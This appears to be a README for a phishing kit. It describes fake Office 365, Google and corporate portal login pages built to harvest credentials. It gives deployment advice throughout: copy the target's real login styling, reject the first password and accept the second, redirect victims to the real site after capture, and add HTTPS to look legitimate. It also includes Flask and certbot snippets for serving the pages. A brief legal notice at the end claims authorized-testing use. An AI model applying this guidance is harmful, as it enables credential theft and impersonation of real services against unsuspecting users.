# Phishing Landing Page Templates

Professional-looking fake login pages for credential harvesting.

## Available Templates

### office365_login.html
Microsoft Office 365 login page replica.

**Features:**
- Authentic Office 365 styling
- Responsive design
- Real-time validation
- Error message simulation

---

### google_login.html
Google account login page.

**Features:**
- Google branding
- Multi-step authentication flow
- Remember me option
- Realistic error handling

---

### generic_portal.html
Generic corporate portal login.

**Features:**
- Customizable branding
- Clean professional design
- Works for any company
- Easy to modify

---

## Customization

### Changing Company Branding
```html
<!-- Update logo -->
<div class="logo">
    <img src="company-logo.png" alt="Company">
</div>

<!-- Update colors -->
<style>
    :root {
        --primary-color: #your-color;
        --secondary-color: #your-color;
    }
</style>
```

### Adding SSL Certificate
```bash
# Get Let's Encrypt certificate
certbot certonly --standalone -d your-domain.com

# Configure Flask with SSL
app.run(host='0.0.0.0', port=443, 
        ssl_context=('cert.pem', 'key.pem'))
```

---

## Testing Landing Pages
```bash
# Start local server
python3 -m http.server 8000

# View in browser
http://localhost:8000/office365_login.html

# Test form submission
# Fill out form and verify POST reaches server
```

---

## Best Practices

1. **Match target's actual login**
   - Screenshot real login page
   - Copy exact styling
   - Use same language/terminology

2. **Include realistic elements**
   - Company logo
   - Privacy policy links
   - Help/support links
   - Footer information

3. **Handle errors gracefully**
   - Show "incorrect password" first time
   - Accept on second attempt
   - Redirect to real site after capture

4. **Security considerations**
   - Use HTTPS
   - Secure database
   - Rate limit submissions
   - Log access attempts

---

## Integration

Landing pages integrate with phishing framework:
```python
# In phishing_framework.py
@app.route('/login')
def login_page():
    token = request.args.get('t', '')
    # Serve customized template
    return render_template('office365_login.html', token=token)
```

---

## Legal Notice

These templates are for authorized security testing only.
Creating fake login pages without authorization is illegal.
Always obtain written permission before deployment.